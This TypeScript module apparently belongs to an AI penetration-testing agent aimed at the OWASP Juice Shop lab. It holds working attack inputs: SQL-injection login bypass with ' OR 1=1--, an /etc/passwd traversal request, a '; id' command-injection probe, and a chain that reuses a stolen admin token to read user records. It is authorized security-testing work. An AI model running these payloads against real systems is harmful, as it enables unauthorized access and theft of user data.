import type { Severity } from "../events/types.js";
import type { Session, SessionRequest, SessionResponse } from "../session/index.js";
import { type Artifact, type AttackContext, latestArtifact, type SeedStep } from "./context.js";

export interface AttemptResult {
  /** The attempt confirmed a vuln / reached an objective signal. */
  ok: boolean;
  note: string;
  status?: number;
  /** Failure was transient (transport error / 5xx) — safe to retry. */
  transient?: boolean;
  /** Whether the technique even applies here (false on 404 / hard block). */
  applicable?: boolean;
  evidence?: { request: string; response: string; note?: string };
  /** Artifacts this step discovered, fed into the world-model for later steps. */
  discovered?: Artifact[];
  /** Follow-up steps this confirmation seeds — the chain grows from here. */
  next?: SeedStep[];
  /** Objective reached — kept DISTINCT from `ok` (a finding is not the goal). */
  reachesObjective?: boolean;
  /** Label of the artifact this step consumed from a prior step (for evidence linking). */
  consumed?: string;
}

export interface AttemptOpts {
  /** Route through the stateful session (vs. a raw tool call). */
  useSession: boolean;
  /** The specific in-scope URL this attempt targets. */
  url: string;
  /** Lowercased tokens from the objective used as a generic success signal. */
  objectiveHint?: string[];
  /** The run's world-model — artifacts earlier steps discovered. */
  context?: AttackContext;
}

/**
 * Chain technique names the loop seeds deterministically (independent of the
 * model, so the flagship chain runs even cold / quota-dead). Matched by exact
 * name before the free-form keyword classifier.
 */
export const T_AUTH_BYPASS = "SQL Injection — authentication bypass";
export const T_ADMIN_ACCESS = "Authenticated admin access";

/**
 * A single exploit attempt. This is the one deliberately small, lab-specific
 * surface: hand-written attempts against the authorized target go HERE, each
 * narrow and readable. It is NOT a generalized exploit toolkit and embeds no
 * payload library — that is an anti-pattern for an authorized agent.
 *
 * `attempt` dispatches on the (free-form, LLM-authored) `technique` string: a
 * small switch of per-technique, non-destructive checks, each firing `ok: true`
 * only when its OWN signal is observed, so a grounded candidate and an
 * ungrounded one no longer share the same outcome. Anything unrecognized falls
 * back to the baseline access probe, so nothing regresses.
 *
 * Every check is a safe, read-only probe: it routes a gated request through the
 * session and reports a structured, interpretable result (confirmed / transient
 * / not-applicable) for the recover loop. None mutate target state.
 */
export async function attempt(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  // Chain steps are matched by exact name first: they carry state across steps
  // (consume/produce artifacts) rather than being a one-shot keyword probe.
  if (technique === T_AUTH_BYPASS) return authBypassCheck(session, technique, opts);
  if (technique === T_ADMIN_ACCESS) return authenticatedAdminCheck(session, technique, opts);

  switch (classify(technique)) {
    case "sqli":
      return sqlInjectionCheck(session, technique, opts);
    case "xss":
      return xssCheck(session, technique, opts);
    case "csrf":
      return csrfCheck(session, technique, opts);
    case "traversal":
      return pathTraversalCheck(session, technique, opts);
    case "cmdi":
      return commandInjectionCheck(session, technique, opts);
    case "bac":
      // A broken-access-intent technique may reach the known admin surface.
      return accessControlCheck(session, technique, opts, true);
    default:
      // The true fallback: baseline access probe of opts.url only, so an
      // unrecognized technique never auto-confirms off another surface.
      return accessControlCheck(session, technique, opts, false);
  }
}

type Kind = "sqli" | "xss" | "csrf" | "traversal" | "cmdi" | "bac" | "fallback";

/** Map free-form LLM technique text onto a check via normalized keywords. */
function classify(technique: string): Kind {
  const t = technique.toLowerCase();
  if (t.includes("sql")) return "sqli"; // "SQL injection", "SQLi", "blind SQL"
  if (t.includes("xss") || t.includes("cross-site scripting") || t.includes("cross site scripting"))
    return "xss";
  if (t.includes("csrf") || t.includes("cross-site request") || t.includes("cross site request"))
    return "csrf";
  if (
    t.includes("traversal") ||
    t.includes("file inclusion") ||
    t.includes("lfi") ||
    t.includes("rfi")
  )
    return "traversal";
  if (
    t.includes("command inject") ||
    t.includes("os command") ||
    t.includes("rce") ||
    t.includes("remote code") ||
    t.includes("code execution")
  )
    return "cmdi";
  if (
    t.includes("access") || // "broken access control", the loop's "access-probe"
    t.includes("idor") ||
    t.includes("insecure direct object") ||
    t.includes("authorization") ||
    t.includes("auth bypass") ||
    t.includes("privilege") ||
    t.includes("forced brows")
  )
    return "bac";
  return "fallback";
}

/** Severity, CVSS, and remediation for a confirmed finding of a given class. */
export interface FindingProfile {
  name: string;
  severity: Severity;
  cvss: string;
  cvssScore: number;
  remediation: string;
}

const PROFILES: Record<Kind, FindingProfile> = {
  sqli: {
    name: "SQL Injection",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    remediation:
      "Use parameterized queries or prepared statements for every database access and never concatenate untrusted input into SQL. Add allow-list input validation and run the application under a least-privilege database account.",
  },
  xss: {
    name: "Reflected Cross-Site Scripting (XSS)",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N",
    cvssScore: 7.4,
    remediation:
      "Context-encode all untrusted output and rely on the framework's auto-escaping, serve a strict Content-Security-Policy, and treat any raw-HTML sink as a mandatory review gate.",
  },
  csrf: {
    name: "Cross-Site Request Forgery (CSRF)",
    severity: "medium",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:L/A:N",
    cvssScore: 5.4,
    remediation:
      "Set SameSite=Lax or Strict on session cookies, require a per-session anti-CSRF token on every state-changing request, and verify the Origin or Referer header server-side.",
  },
  traversal: {
    name: "Path Traversal / File Inclusion",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cvssScore: 7.5,
    remediation:
      "Canonicalize paths and confine file access to an allow-listed base directory, reject directory-traversal sequences after normalization, and never hand user input to filesystem APIs directly.",
  },
  cmdi: {
    name: "OS Command Injection",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    remediation:
      "Never pass user input to a shell; invoke processes with an argument array and no shell interpolation, apply strict allow-list validation, and run with least privilege.",
  },
  bac: {
    name: "Broken Access Control",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
    cvssScore: 7.5,
    remediation:
      "Enforce server-side authorization on every request against the authenticated principal, deny by default, and never rely on unlinked or obscure URLs for protection.",
  },
  fallback: {
    name: "Security Exposure",
    severity: "medium",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
    cvssScore: 5.3,
    remediation:
      "Manually confirm this exposure, verify server-side authorization and input handling on the affected surface, and add a regression test that keeps it closed.",
  },
};

/**
 * Map a confirmed attempt onto a client-ready finding profile: a severity and
 * CVSS vector argued from the vulnerability class, plus concrete remediation.
 * This is what turns a raw `ok: true` into something a consultant would sign —
 * never a hard-coded "high". A cited CVE appends a patch directive.
 */
const CHAIN_PROFILES: Record<string, FindingProfile> = {
  [T_AUTH_BYPASS]: {
    name: "SQL Injection — Authentication Bypass",
    severity: "critical",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    cvssScore: 9.8,
    remediation:
      "Use parameterized queries for the authentication lookup so credentials can never alter query structure, and never build the login SQL by string concatenation. Add server-side rate limiting and generic auth-failure responses.",
  },
  [T_ADMIN_ACCESS]: {
    name: "Broken Access Control — Privilege Escalation",
    severity: "high",
    cvss: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N",
    cvssScore: 8.1,
    remediation:
      "Enforce server-side role checks on every admin resource against the authenticated principal, deny by default, and reject tokens whose subject lacks the admin role instead of trusting a valid signature alone.",
  },
};

export function findingProfile(technique: string, cve?: string): FindingProfile {
  const base = CHAIN_PROFILES[technique] ?? PROFILES[classify(technique)];
  if (!cve) return base;
  return {
    ...base,
    remediation: `${base.remediation} Patch the affected component to a fixed release that resolves ${cve}.`,
  };
}

// --- shared transport layer ------------------------------------------------

type Base = { status: number; evidence: { request: string; response: string } };

/** A sent request, already classified against the stable transport contract. */
type Sent =
  | { kind: "result"; result: AttemptResult }
  | { kind: "ok"; res: SessionResponse; snippet: string; base: Base };

/**
 * Perform one gated request, applying only the transport/scope contract. The
 * status contract (5xx / 404) is left to the caller, because a check like
 * error-based SQLi needs to read a 5xx body before it is written off as
 * transient. Always returns the response on a successful round-trip.
 */
async function rawSend(session: Session, req: SessionRequest, label?: string): Promise<Sent> {
  const request = label ?? `${req.method ?? "GET"} ${req.url}`;
  let res: SessionResponse;
  try {
    res = await session.request(req);
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    const blocked = msg.startsWith("blocked by scope gate");
    return {
      kind: "result",
      result: {
        ok: false,
        note: blocked ? "blocked by gate" : `transport error: ${msg}`,
        transient: !blocked,
        applicable: !blocked,
      },
    };
  }

  const snippet = res.body.slice(0, 2000);
  const base = { status: res.status, evidence: { request, response: snippet } };
  return { kind: "ok", res, snippet, base };
}

/** The stable status contract: 5xx → transient, 404/405 → not applicable. */
function statusResult(res: SessionResponse, base: Base): AttemptResult | undefined {
  if (res.status >= 500) {
    return {
      ok: false,
      note: `server error ${res.status}`,
      transient: true,
      applicable: true,
      ...base,
    };
  }
  if (res.status === 404 || res.status === 405) {
    return { ok: false, note: `absent (${res.status})`, applicable: false, ...base };
  }
  return undefined;
}

/**
 * Perform one gated request and apply the loop-wide contract uniformly:
 * transport/scope error, 5xx (transient), 404/405 (not applicable). Returns
 * either a terminal `result` or the usable response for a per-technique signal.
 */
async function send(session: Session, req: SessionRequest, label?: string): Promise<Sent> {
  const sent = await rawSend(session, req, label);
  if (sent.kind === "result") return sent;
  const terminal = statusResult(sent.res, sent.base);
  return terminal ? { kind: "result", result: terminal } : sent;
}

/** Append a query parameter without clobbering an existing query string. */
function withParam(url: string, key: string, value: string): string {
  try {
    const u = new URL(url);
    u.searchParams.set(key, value);
    return u.toString();
  } catch {
    const sep = url.includes("?") ? "&" : "?";
    return `${url}${sep}${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
  }
}

/** True when the URL is the bare site root — no path and no query to probe. */
function isRoot(url: string): boolean {
  try {
    const u = new URL(url);
    return (u.pathname === "/" || u.pathname === "") && u.search === "";
  } catch {
    return false;
  }
}

// Lab-specific surfaces for the authorized first target (OWASP Juice Shop).
// This file is the one deliberately lab-specific surface (see the header), so
// the known endpoints live here. A hypothesis candidate reaches `attempt` with
// only the site root as its probe URL (the loop's default), so when handed the
// root we steer each technique to the surface where its signal actually lives;
// a more specific in-scope URL (e.g. one recon discovered) is used verbatim.
const SEARCH_SURFACE = "/rest/products/search";
const ADMIN_CONFIG_SURFACE = "/rest/admin/application-configuration";
const LOGIN_SURFACE = "/rest/user/login";
const USERS_SURFACE = "/api/Users";

/** When `url` is the bare root, retarget to a known in-scope surface `path`. */
function surfaceFor(url: string, path: string): string {
  if (!isRoot(url)) return url;
  try {
    return new URL(path, new URL(url).origin).toString();
  } catch {
    return url;
  }
}

// --- per-technique checks --------------------------------------------------

const SQL_ERROR =
  /\bsql(ite)?(3)?\b|SQLITE_ERROR|syntax error|unterminated|ORA-\d{3,}|psql:|postgres|mysql_fetch|near ["']|unrecognized token|no such column/i;

/**
 * SQL injection — error-based, non-destructive: append a quote-pair that closes
 * both single- and double-quoted string contexts and look for a leaked DB
 * error. Read-only; it provokes a parse error, never a write. The leaked error
 * often rides a 5xx, so this check reads the body BEFORE the status contract —
 * a DB error in a 500 is a confirmed finding here, not a transient failure.
 */
async function sqlInjectionCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", `'"`);
  const sent = await rawSend(session, { url }, `GET ${url}`);
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  if (SQL_ERROR.test(snippet)) {
    return {
      ok: true,
      note: `${technique}: DB error surfaced by a quote probe (error-based SQLi signal)`,
      applicable: true,
      ...base,
    };
  }
  // No signal: fall back to the stable status contract (5xx transient, 404 n/a).
  return (
    statusResult(res, base) ?? {
      ok: false,
      note: `${technique}: no DB error from quote probe`,
      applicable: true,
      ...base,
    }
  );
}

// A benign reflection marker. The angle brackets are the signal: if they come
// back un-encoded in an HTML body, the sink does not escape — no script runs.
const XSS_MARKER = "nfx7q9<i>";

/**
 * Reflected XSS — non-destructive: send a benign marker and confirm its angle
 * brackets are echoed verbatim (un-escaped) into an HTML response. No active
 * script payload, no execution.
 */
async function xssCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", XSS_MARKER);
  const sent = await send(session, { url }, `GET ${url}`);
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  const ctype = (res.headers["content-type"] ?? res.headers["Content-Type"] ?? "").toLowerCase();
  const isHtml = ctype.includes("html") || snippet.trimStart().startsWith("<");
  if (isHtml && snippet.includes(XSS_MARKER)) {
    return {
      ok: true,
      note: `${technique}: marker reflected un-escaped into HTML (reflected-XSS signal)`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: marker not reflected un-escaped`,
    applicable: true,
    ...base,
  };
}

/**
 * CSRF — non-destructive: fetch the surface and inspect whether a session
 * cookie is issued without SameSite protection and no anti-CSRF token is in
 * play. GET-only; it never submits a forged state-changing request.
 */
async function csrfCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const sent = await send(session, { url: opts.url });
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  const setCookie = (res.headers["set-cookie"] ?? res.headers["Set-Cookie"] ?? "").toLowerCase();
  const hasSession = /sess|sid|token|auth|connect\.sid/.test(setCookie);
  const sameSite = setCookie.includes("samesite");
  const hasAntiCsrf =
    /csrf|xsrf/i.test(JSON.stringify(res.headers)) || /csrf|xsrf|_token/i.test(snippet);

  if (hasSession && !sameSite && !hasAntiCsrf) {
    return {
      ok: true,
      note: `${technique}: session cookie set without SameSite and no anti-CSRF token (CSRF-exposed)`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: CSRF defenses present or no session cookie issued`,
    applicable: true,
    ...base,
  };
}

const TRAVERSAL_HIT =
  /root:[x*]?:0:0:|\[boot loader\]|\[fonts\]|; for 16-bit app support|daemon:.*:\/usr\/sbin/i;

/**
 * Path traversal / file inclusion — non-destructive read: ask for a file above
 * the web root via a dot-dot sequence and confirm host-file contents leak. It
 * only reads; it writes nothing.
 */
async function pathTraversalCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "file", "../../../../etc/passwd");
  const sent = await send(session, { url }, `GET ${url}`);
  if (sent.kind === "result") return sent.result;
  const { snippet, base } = sent;

  if (TRAVERSAL_HIT.test(snippet)) {
    return {
      ok: true,
      note: `${technique}: host file contents leaked via dot-dot sequence (path-traversal signal)`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: no file contents leaked`,
    applicable: true,
    ...base,
  };
}

const CMD_OUTPUT = /uid=\d+\(.*?\)\s+gid=\d+\(|total \d+\s+drwx|root:[x*]?:0:0:/i;

/**
 * Command injection — the most invasive class, kept deliberately conservative:
 * a benign, inert separator probe (`;id`) and a check for shell-output
 * signatures. It confirms only on clear evidence and otherwise reports a plain
 * negative — no destructive payloads, no blind time-based escalation.
 */
async function commandInjectionCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = withParam(surfaceFor(opts.url, SEARCH_SURFACE), "q", "; id");
  const sent = await send(session, { url }, `GET ${url}`);
  if (sent.kind === "result") return sent.result;
  const { snippet, base } = sent;

  if (CMD_OUTPUT.test(snippet)) {
    return {
      ok: true,
      note: `${technique}: shell command output observed (command-injection signal)`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: no command output observed`,
    applicable: true,
    ...base,
  };
}

/** GET `url` and report whether a reachable page matches the objective tokens. */
async function probeObjective(
  session: Session,
  technique: string,
  url: string,
  hint: string[],
): Promise<AttemptResult> {
  const sent = await send(session, { url });
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  const hay = `${url} ${snippet}`.toLowerCase();
  const matched = hint.filter((t) => t.length > 2 && hay.includes(t));
  if (res.status < 400 && matched.length > 0) {
    return {
      ok: true,
      note: `${technique}: reached objective signal [${matched.join(", ")}] at ${res.status}`,
      applicable: true,
      ...base,
    };
  }
  return {
    ok: false,
    note: `${technique}: reachable (${res.status}), no objective signal`,
    applicable: true,
    ...base,
  };
}

/**
 * Broken access control / baseline probe (also the fallback for unrecognized
 * techniques): a plain GET of a gated surface. Confirms when a reachable page
 * matches the objective tokens — e.g. an admin surface served without the
 * expected auth, provable without any payload. When `steer` is set (a
 * broken-access-intent technique) and it is handed only the site root, it also
 * reaches the known admin surface, since that is where the access signal lives
 * and the root shell alone rarely carries the objective tokens. Unrecognized
 * techniques pass `steer: false`, so they never confirm off a surface the
 * candidate didn't name.
 */
async function accessControlCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
  steer: boolean,
): Promise<AttemptResult> {
  const hint = opts.objectiveHint ?? [];
  // An unrecognized technique handed only the site root has no specific surface
  // to prove anything against — an objective word appearing on the landing page
  // is not evidence of broken access, so it must not confirm there.
  if (!steer && isRoot(opts.url)) {
    return {
      ok: false,
      applicable: true,
      note: `${technique}: no specific in-scope surface to probe`,
    };
  }
  const direct = await probeObjective(session, technique, opts.url, hint);
  if (direct.ok || !steer || !isRoot(opts.url)) return direct;

  // Root with no signal: try the known broken-access surface before giving up.
  const admin = surfaceFor(opts.url, ADMIN_CONFIG_SURFACE);
  if (admin === opts.url) return direct;
  const viaAdmin = await probeObjective(session, technique, admin, hint);
  return viaAdmin.ok ? viaAdmin : direct;
}

// --- the multi-step chain -------------------------------------------------

const TOKEN_RE = /"token"\s*:\s*"([^"]+)"/;

/** Show enough of a secret to prove it is real, without printing it in full. */
function redact(secret: string): string {
  if (secret.length <= 16) return "…[redacted]";
  return `${secret.slice(0, 16)}…[redacted, ${secret.length} chars]`;
}

/** Bound a response snippet for evidence. */
function clip(body: string, max = 800): string {
  return body.length <= max ? body : `${body.slice(0, max)}\n… [${body.length - max} more bytes]`;
}

/**
 * Step 1 of the chain — SQL injection in the authentication query. A non-
 * destructive login POST with `' OR 1=1--` in the email field: if the lookup is
 * built by string concatenation, it matches the first user (the administrator)
 * and the server hands back a valid session token with no password. The token
 * is published to the world-model and an authenticated follow-up is seeded. The
 * injection string only reads the auth table; it writes nothing.
 */
async function authBypassCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const url = surfaceFor(opts.url, LOGIN_SURFACE);
  const payload = { email: "' OR 1=1--", password: "x" };
  const sent = await rawSend(
    session,
    {
      url,
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(payload),
    },
    `POST ${url}  {"email":"' OR 1=1--","password":"x"}`,
  );
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  const m = snippet.match(TOKEN_RE);
  if (res.status < 400 && m?.[1]) {
    const token = m[1];
    return {
      ok: true,
      reachesObjective: false,
      applicable: true,
      status: res.status,
      note: `${technique}: login returned a valid session token for an injected identity — authentication bypassed`,
      discovered: [{ kind: "token", value: token, label: "admin session JWT", from: technique }],
      next: [
        {
          technique: T_ADMIN_ACCESS,
          reason: "use the bypassed session token to reach an admin-only resource",
        },
      ],
      evidence: {
        request: base.evidence.request,
        response: snippet.replace(token, redact(token)),
        note: "`' OR 1=1--` in the email field returned HTTP 200 with a signed JWT and no valid credentials",
      },
    };
  }
  return {
    ok: false,
    note: `${technique}: injected login did not return a token (${res.status})`,
    applicable: true,
    ...base,
  };
}

/**
 * Step 2 of the chain — consume the bypassed token. Proves privilege escalation
 * by contrast: the admin-only endpoint is requested once WITHOUT the token
 * (expected 401/403) and once WITH it. A 2xx only when the token is attached is
 * authenticated access the agent was never granted — and reaching it satisfies
 * the objective. Read-only; it enumerates, it does not mutate.
 */
async function authenticatedAdminCheck(
  session: Session,
  technique: string,
  opts: AttemptOpts,
): Promise<AttemptResult> {
  const token = opts.context ? latestArtifact(opts.context, "token") : undefined;
  if (!token) {
    return {
      ok: false,
      applicable: false,
      note: `${technique}: no session token in the world-model yet`,
    };
  }
  const url = surfaceFor(opts.url, USERS_SURFACE);

  const unauth = await rawSend(session, { url }, `GET ${url}  (no token)`);
  const unauthStatus = unauth.kind === "ok" ? unauth.res.status : (unauth.result.status ?? 0);

  const sent = await send(
    session,
    { url, headers: { authorization: `Bearer ${token.value}` } },
    `GET ${url}  (Authorization: Bearer <bypassed admin JWT>)`,
  );
  if (sent.kind === "result") return sent.result;
  const { res, snippet, base } = sent;

  if (res.status < 400 && (unauthStatus === 401 || unauthStatus === 403)) {
    return {
      ok: true,
      reachesObjective: true,
      applicable: true,
      status: res.status,
      consumed: token.label,
      note: `${technique}: admin-only resource returned ${res.status} WITH the bypassed token but ${unauthStatus} without it — privilege escalation, objective reached`,
      discovered: [
        {
          kind: "data",
          value: clip(snippet, 400),
          label: "admin-only user records",
          from: technique,
        },
      ],
      evidence: {
        request: base.evidence.request,
        response: clip(snippet),
        note: `unauthenticated this endpoint returns ${unauthStatus}; with the JWT from step 1 it returns ${res.status} and admin-only data — authenticated access the agent was never granted`,
      },
    };
  }
  return {
    ok: false,
    note: `${technique}: admin endpoint returned ${res.status} (unauth ${unauthStatus}) — not a clean escalation`,
    applicable: true,
    ...base,
  };
}
